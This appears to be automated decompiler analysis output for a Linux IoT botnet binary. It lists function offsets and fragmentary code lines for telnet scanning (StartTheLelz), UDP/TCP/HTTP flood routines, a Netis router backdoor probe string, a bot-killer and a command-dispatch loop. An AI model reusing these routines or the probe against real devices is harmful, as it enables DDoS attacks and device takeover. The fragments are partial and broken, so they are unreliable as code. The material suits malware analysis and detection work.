++++++++ FUNCTION START 3889
++++++++ FUNCTION END 4030
++++++++ FUNCTION LENGTH 141
    return print(NULL, a1, (int32_t)&v138);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 36550
++++++++ FUNCTION END 36689
++++++++ FUNCTION LENGTH 139
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 43991
++++++++ FUNCTION END 44138
++++++++ FUNCTION LENGTH 147
    __GI_random_r(&v139, (int32_t)&result);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 52499
++++++++ FUNCTION END 52738
++++++++ FUNCTION LENGTH 239
        while (true) {
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 36266
++++++++ FUNCTION END 36405
++++++++ FUNCTION LENGTH 139
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 44444
++++++++ FUNCTION END 44589
++++++++ FUNCTION LENGTH 145
    srandom_r((int64_t)a1, (int32_t)&v139);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 10757
++++++++ FUNCTION END 10905
++++++++ FUNCTION LENGTH 148
        __libc_close(a1);
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 36834
++++++++ FUNCTION END 36973
++++++++ FUNCTION LENGTH 139
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 35095
++++++++ FUNCTION END 35259
++++++++ FUNCTION LENGTH 164
    while (true) {
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 35555
++++++++ FUNCTION END 35698
++++++++ FUNCTION LENGTH 143
    gethostbyname_r(a1, &v139, (int32_t)&v138, 460, (int32_t)&result, v136, v137, v137);
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 28274
++++++++ FUNCTION END 28473
++++++++ FUNCTION LENGTH 199
        while (true) {
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 25072
++++++++ FUNCTION END 25238
++++++++ FUNCTION LENGTH 166
    int32_t result = _vfprintf_internal(v140, (char *)a3, a4, v138 + v144); // 0x80500d0
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 20709
++++++++ FUNCTION END 20860
++++++++ FUNCTION LENGTH 151
    int32_t v138 = close(fd); // 0x804fa18
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 23850
++++++++ FUNCTION END 23990
++++++++ FUNCTION LENGTH 140
    return wait4(a1, a2, a3, 0);
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 32165
++++++++ FUNCTION END 32330
++++++++ FUNCTION LENGTH 165
    while (true) {
=================FUNCTION : socket ===================
++++++++ FUNCTION START 37260
++++++++ FUNCTION END 37399
++++++++ FUNCTION LENGTH 139
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 64791
++++++++ FUNCTION END 65009
++++++++ FUNCTION LENGTH 218
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 7114
++++++++ FUNCTION END 7264
++++++++ FUNCTION LENGTH 150
        __libc_close(*a1);
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4997
++++++++ FUNCTION END 5179
++++++++ FUNCTION LENGTH 182
    while (true) {
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 36408
++++++++ FUNCTION END 36547
++++++++ FUNCTION LENGTH 139
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 24785
++++++++ FUNCTION END 24925
++++++++ FUNCTION LENGTH 140
    return _stdio_fopen(a1, (char *)a2, 0, -1);
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 33692
++++++++ FUNCTION END 33862
++++++++ FUNCTION LENGTH 170
    while (true) {
=================FUNCTION : _fini ===================
++++++++ FUNCTION START 68237
++++++++ FUNCTION END 68379
++++++++ FUNCTION LENGTH 142
    __get_pc_thunk_bx(v138);
=================FUNCTION : kill ===================
++++++++ FUNCTION START 22282
++++++++ FUNCTION END 22434
++++++++ FUNCTION LENGTH 152
    int32_t v140 = kill(v138, v139); // 0x804fc3b
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 28626
++++++++ FUNCTION END 28942
++++++++ FUNCTION LENGTH 316
        while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 21517
++++++++ FUNCTION END 21664
++++++++ FUNCTION LENGTH 147
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 21817
++++++++ FUNCTION END 21969
++++++++ FUNCTION LENGTH 152
    int32_t pid = getpid(v138); // 0x804fb95
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5561
++++++++ FUNCTION END 5702
++++++++ FUNCTION LENGTH 141
    int32_t v138 = inet_addr(a1); // 0x8048e2c
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 19948
++++++++ FUNCTION END 20089
++++++++ FUNCTION LENGTH 141
    uint32_t result = vfork(); // 0x804f906
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 6665
++++++++ FUNCTION END 6806
++++++++ FUNCTION LENGTH 141
    return __GI_inet_ntoa(v138);
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 61146
++++++++ FUNCTION END 61286
++++++++ FUNCTION LENGTH 140
    return kill(__libc_getpid(), a1);
=================FUNCTION : rand ===================
++++++++ FUNCTION START 43848
++++++++ FUNCTION END 43988
++++++++ FUNCTION LENGTH 140
    return random();
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 37118
++++++++ FUNCTION END 37257
++++++++ FUNCTION LENGTH 139
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : __bsd_signal ===================
++++++++ FUNCTION START 37703
++++++++ FUNCTION END 37890
++++++++ FUNCTION LENGTH 187
        while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 30347
++++++++ FUNCTION END 30508
++++++++ FUNCTION LENGTH 161
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3, v141); // 0x805116e
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 36976
++++++++ FUNCTION END 37115
++++++++ FUNCTION LENGTH 139
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 64127
++++++++ FUNCTION END 64346
++++++++ FUNCTION LENGTH 219
        while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 10609
++++++++ FUNCTION END 10754
++++++++ FUNCTION LENGTH 145
    rand_cmwc((int32_t)v139);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 35262
++++++++ FUNCTION END 35402
++++++++ FUNCTION LENGTH 140
    return __GI_inet_ntoa_r(a1, (int32_t)&v137);
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 27103
++++++++ FUNCTION END 27274
++++++++ FUNCTION LENGTH 171
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 34222
++++++++ FUNCTION END 34362
++++++++ FUNCTION LENGTH 140
    return __GI_tcgetattr(a1, &v138) == 0;
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 67435
++++++++ FUNCTION END 67651
++++++++ FUNCTION LENGTH 216
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5182
++++++++ FUNCTION END 5349
++++++++ FUNCTION LENGTH 167
    while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 63193
++++++++ FUNCTION END 63359
++++++++ FUNCTION LENGTH 166
    while (true) {
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4033
++++++++ FUNCTION END 4174
++++++++ FUNCTION LENGTH 141
    return print(&v138, a1, (int32_t)&v139);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 61003
++++++++ FUNCTION END 61143
++++++++ FUNCTION LENGTH 140
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 10462
++++++++ FUNCTION END 10606
++++++++ FUNCTION LENGTH 144
    free(v138);
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 63362
++++++++ FUNCTION END 63538
++++++++ FUNCTION LENGTH 176
        while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 6958
++++++++ FUNCTION END 7111
++++++++ FUNCTION LENGTH 153
        result = __libc_recv(a1, a3, a4, 0);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 67891
++++++++ FUNCTION END 68072
++++++++ FUNCTION LENGTH 181
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 24928
++++++++ FUNCTION END 25069
++++++++ FUNCTION LENGTH 141
    return __GI_vsnprintf((char *)a1, -1, a2, (int32_t)&v138);
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 36692
++++++++ FUNCTION END 36831
++++++++ FUNCTION LENGTH 139
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 32663
++++++++ FUNCTION END 32832
++++++++ FUNCTION LENGTH 169
    while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 32491
++++++++ FUNCTION END 32660
++++++++ FUNCTION LENGTH 169
    while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2490 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2546 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2898 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2912 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v140, v139);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3057 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3071 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v140, v139);
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 3590 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3878 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)result, v146);
		while (true) {
		while (true) {
		int32_t v172 = prints(v170, NULL, (int32_t)&v171, (int32_t)&v171); // 0x8048798
		int32_t v174 = printi(v173) + result; // 0x8048769
		result2 = printi(v169) + result;
		result2 = printi(v168) + result;
		result2 = printi(v167) + result;
		int32_t v176 = prints((int32_t)v175, (char *)v157, v151, result) + result; // 0x8048685
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 4960 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4984 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v145 = __libc_waitpid(v144, (int32_t)&v143, 0); // 0x8048ba6
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
=============================WHILE LOOPS ID : 9 @ getBogos ====================================
++++++++ WHILE START : 6012 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 6070 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v139);
		if (strstr(v140, "BOGOMIPS") != v140) {
		if (fdgets(v140, 0x1000, v138) == 0) {
		while (true) {
		while (true) {
		__libc_close(v138);
=============================WHILE LOOPS ID : 10 @ recvLine ====================================
++++++++ WHILE START : 6564 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6625 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v154, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v154, (int32_t)&v157, 1, 0) != 1) {
=============================WHILE LOOPS ID : 13 @ contains_string ====================================
++++++++ WHILE START : 8003 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 8019 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v141) == 0) {
=============================WHILE LOOPS ID : 14 @ listFork ====================================
++++++++ WHILE START : 8374 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 8391 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v142);
=============================WHILE LOOPS ID : 15 @ matchPrompt ====================================
++++++++ WHILE START : 8739 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 8791 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 16 @ readUntil ====================================
++++++++ WHILE START : 8937 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 9025 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v144 = __libc_recv(a1, v143, 1, 0); // 0x8049af0
		int32_t v147 = __libc_recv(a1, v143 + 1, 2, 0); // 0x8049b31
		if (strstr(v139, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 20 @ StartTheLelz ====================================
++++++++ WHILE START : 11273 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 11936 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		socket(0x10000 * v169 / 0x10000, v170, v168);
		if (__libc_connect(v170, v168, 0) == -1) {
		GetRandomPublicIP(v158);
		socket(0x10000 * v169 / 0x10000, v170, v168);
		case 1: {
		getsockopt(v164, v163, v179, a1, v175);
		case 2: {
		case 3: {
		if (__libc_send(v182, v142, v158, (int32_t)&v166) >= 0) {
		if (__libc_send(v182, v142, v158, (int32_t)&v166) >= 0) {
		case 4: {
		case 5: {
		if (__libc_send(v184, v145, v142, v158) >= 0) {
		if (__libc_send(v184, v145, v142, v158) >= 0) {
		case 6: {
		get_telstate_host();
		sockprintf(v147, v145);
		case 7: {
		__libc_send(v147, v145, v142, v158);
		__libc_send(v147, v145, v142, v158);
		if (__libc_send(v187, v147, v145, v142) >= 0) {
=============================WHILE LOOPS ID : 23 @ sendSTD ====================================
++++++++ WHILE START : 12125 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 12151 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v138, v148, 65, 0);
		__libc_connect(v138, v141, 16);
		__libc_close(v138);
=============================WHILE LOOPS ID : 24 @ sendUDP ====================================
++++++++ WHILE START : 12326 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12363 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v142, v144, a5, 0, (int32_t)&v139, 16);
		rand_cmwc(v142);
=============================WHILE LOOPS ID : 25 @ sendUDP ====================================
++++++++ WHILE START : 12434 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12489 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v162, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164, (int32_t)&v164);
		*v154 = (int16_t)(0x10000 * rand_cmwc(v162) / 0x10000);
		v165 = rand_cmwc(v162);
		*(int16_t *)(v152 | 4) = (int16_t)(0x10000 * rand_cmwc(v168) / 0x10000);
		GetRandomIP(v168, (int32_t)&v164);
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 12722 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 12857 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v178 = ((int32_t)(v176 | _strncmp(v163, "rst", 4) % 2 == 0) | v177) ^ 1; // 0x804d096
		int32_t v188 = ((int32_t)(v186 | _strncmp(v163, "psh", 4) % 2 == 0) | v187) ^ 1; // 0x804d189
		sockprintf(4, (int32_t)"psh");
		v172 = "psh";
		v172 = "psh";
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 12881 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 12910 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v155, v144, v139, v140, v141, 0);
		GetRandomIP(v155, v144);
		*(int16_t *)(v145 | 4) = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
		*v149 = rand_cmwc(v155);
		*v147 = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
		*v159 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 28 @ sendTCP ====================================
++++++++ WHILE START : 12949 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 12964 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v155, v144, v139, v140, v141, 0);
		GetRandomIP(v155, v144);
		*(int16_t *)(v145 | 4) = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
		*v149 = rand_cmwc(v155);
		*v147 = (int16_t)(0x10000 * rand_cmwc(v155) / 0x10000);
		*v159 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 29 @ botkiller ====================================
++++++++ WHILE START : 13116 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 13136 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v138);
		__libc_system(v138);
=============================WHILE LOOPS ID : 30 @ NetisScanner ====================================
++++++++ WHILE START : 13282 
++++++++ WHILE FUNCTION : NetisScanner 
++++++++ WHILE END : 13290 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = socket(2, 2, 17); // 0x804d450
		NetisRanges(0x10000 * htons(0xd0a5) / 0x10000);
		__libc_sendto(v140, (int32_t)"AAAAAAAAnetcore", _strlen("AAAAAAAAnetcore"), 0, v139, 16);
		__libc_sendto(v140, (int32_t)"AA", _strlen("AA"), 0, v139, 16);
		__libc_close(v140);
=============================WHILE LOOPS ID : 31 @ sendHTTP ====================================
++++++++ WHILE START : 13588 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 13626 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork(v142) != 0) {
		while (true) {
		int32_t v143 = socket_connect(a1, a3); // 0x804d641
		__libc_close(v143);
=============================WHILE LOOPS ID : 33 @ processCmd ====================================
++++++++ WHILE START : 14549 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14558 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 14629 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14639 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 14703 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14712 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 39 @ processCmd ====================================
++++++++ WHILE START : 14765 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14783 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 14806 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14860 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v142, (int32_t)"None Killed.");
		sockprintf(v142, (int32_t)"Killed %d.");
		if (*v299 != __libc_getpid()) {
		kill(v301, 9);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 14901 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14917 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v302, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 15082 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15091 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 15137 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15154 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v304, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 49 @ processCmd ====================================
++++++++ WHILE START : 15217 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15226 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 52 @ processCmd ====================================
++++++++ WHILE START : 15346 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15355 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 15423 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15433 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 15492 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15501 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 15617 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15633 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 15662 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15674 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 15741 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15750 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 15814 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15824 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 65 @ processCmd ====================================
++++++++ WHILE START : 15883 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15892 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 68 @ processCmd ====================================
++++++++ WHILE START : 16012 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16021 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 16085 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16095 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 16154 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16163 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 16243 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16255 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 16322 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16331 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 16387 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16397 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 16430 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16439 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 16505 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16514 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 16551 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16561 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 16594 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16603 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 16667 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16676 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 16707 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16719 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 16759 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16768 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 16806 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16816 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 16849 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16858 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 16924 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16933 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 16970 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16980 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 17013 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17022 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 17129 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17145 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 17177 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17186 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 17411 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17423 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 17463 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17472 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 17510 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17520 
++++++++ INTRESTING INSTRUCTIONS :  
